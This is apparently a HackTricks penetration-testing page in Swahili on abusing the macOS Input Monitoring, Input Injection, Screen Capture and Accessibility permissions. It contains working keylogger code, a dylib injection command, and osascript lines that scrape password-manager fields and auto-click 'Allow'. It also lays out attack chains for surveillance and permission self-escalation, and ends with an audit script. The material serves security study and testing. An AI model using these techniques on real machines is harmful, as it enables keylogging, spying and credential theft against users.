# Matumizi Mabaya ya Input Monitoring, Screen Capture na Accessibility kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Huduma tatu zinazohusiana za TCC hudhibiti jinsi applications zinavyoweza kuchunguza na kuingiliana na session ya desktop ya mtumiaji:

| Huduma ya TCC | Ruhusa | Uwezo |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Kusoma matukio yote ya keyboard na mouse kwenye mfumo mzima (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Kuingiza matukio bandia ya keyboard na mouse |
| `kTCCServiceScreenCapture` | **Screen Capture** | Kusoma display buffer, kuchukua screenshots, na kurekodi screen |
| `kTCCServiceAccessibility` | **Accessibility** | Kudhibiti applications nyingine kupitia AXUIElement API, na kusoma vipengele vya UI |

Ruhusa hizi ni **mchanganyiko hatari zaidi kwenye macOS** — kwa pamoja hutoa:
- Keylogging kamili ya kila mbonyezo wa keyboard (passwords, messages, credit cards)
- Kurekodi screen ya maudhui yote yanayoonekana
- Kuingiza synthetic input (kubofya buttons, kuidhinisha dialogs)
- Udhibiti kamili wa GUI sawa na access ya kimwili

---

## Ufuatiliaji wa Input (kTCCServiceListenEvent)

### Jinsi Inavyofanya Kazi

macOS hutumia **`CGEventTap` API** kuruhusu processes kukatiza input events kutoka kwenye Quartz event system. Process yenye ruhusa ya ListenEvent inaweza kuunda event tap inayopokea **kila keyboard na mouse event** kabla au baada ya kufika kwenye target application.<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Kutafuta Binaries zenye Entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging via Code Injection

Ikiwa binary yenye ruhusa ya ListenEvent pia ina **disabled library validation** au **allows DYLD environment variables**, attacker anaweza ku-inject dylib inayosajili CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Dylib iliyoingizwa hurithi idhini ya TCC ya ListenEvent ya target na kunasa mibofyo yote ya vitufe.

### Attack: Credential Harvesting

Keylogger ya kisasa inaweza kuhusisha mibofyo ya vitufe na programu amilifu:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### Jinsi Inavyofanya Kazi

PostEvent permission huruhusu kuunda event tap yenye **`kCGEventTapOptionDefault`** (inaweza kurekebisha/kuingiza events) badala ya ListenOnly.<sup>[[1]](#references)</sup> Hii huwezesha:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Shambulio: Uidhinishaji Otomatiki wa TCC Prompt

Kwa kutumia PostEvent, mshambuliaji anaweza **kuiga kubofya "Allow"** kwenye dialogi za ruhusa za TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Uchukuzi wa Skrini (kTCCServiceScreenCapture)

### Jinsi Inavyofanya Kazi

Ruhusa ya kuchukua picha ya skrini inaruhusu kusoma display buffer kwa kutumia:
- **`CGWindowListCreateImage`** — kunasa dirisha lolote au skrini nzima
- **`ScreenCaptureKit`** (macOS 12.3+) — API ya kisasa ya kutiririsha maudhui ya skrini<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — kunasa skrini kwa acceleration ya hardware
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Kutafuta Clients za Screen Capture
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

Mchakato wa screen capture uliodungwa unaweza kunasa fremu mara kwa mara na kutumia OCR kutoa passwords:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Kuanzia **macOS Sonoma**, screen capture huonyesha **kiashiria kinachoendelea** kwenye menu bar. Kwenye matoleo ya zamani, screen recording ingeweza kufanyika kimya kabisa. Hata hivyo, capture fupi ya frame moja bado inaweza kupita bila watumiaji kuigundua.

### Attack: Session Recording

Continuous screen recording hutoa replay kamili ya session ya mtumiaji:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accessibility (kTCCServiceAccessibility)

### Jinsi Inavyofanya Kazi

Ufikiaji wa Accessibility hutoa udhibiti wa applications nyingine kupitia **AXUIElement API**.<sup>[[2]](#references)</sup> Process yenye accessibility inaweza:

1. **Kusoma** kipengele chochote cha UI katika application yoyote (sehemu za maandishi, labels, buttons, menus)
2. **Kubofya** buttons na kuingiliana na controls
3. **Kuingiza** maandishi katika sehemu yoyote ya maandishi
4. **Kuelekeza** menus na dialogs
5. **Kukusanya** data inayoonyeshwa kutoka kwenye application yoyote inayoendeshwa
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

Unyanyasaji hatari zaidi wa accessibility ni kuvinjari System Settings ili kuipa malware yako mwenyewe permissions za ziada.<sup>[[4]](#references)</sup>
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Shambulio: Kukusanya Data Kati ya Applications
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Shambulio: Automated User Actions
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Minyororo ya Mashambulizi

### Chain: Input Monitoring + Screen Capture = Ufuatiliaji Kamili
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Mlolongo: Accessibility + PostEvent = Udhibiti Kamili wa Mbali
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Msururu: Accessibility → Kujipa Ruhusa ya Camera/Mic → Ufuatiliaji
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Utambuzi na Uorodheshaji
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## References

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Synthetic events and user-interface security on macOS](https://objective-see.org/blog/blog_0x36.html)
{{#include ../../../banners/hacktricks-training.md}}
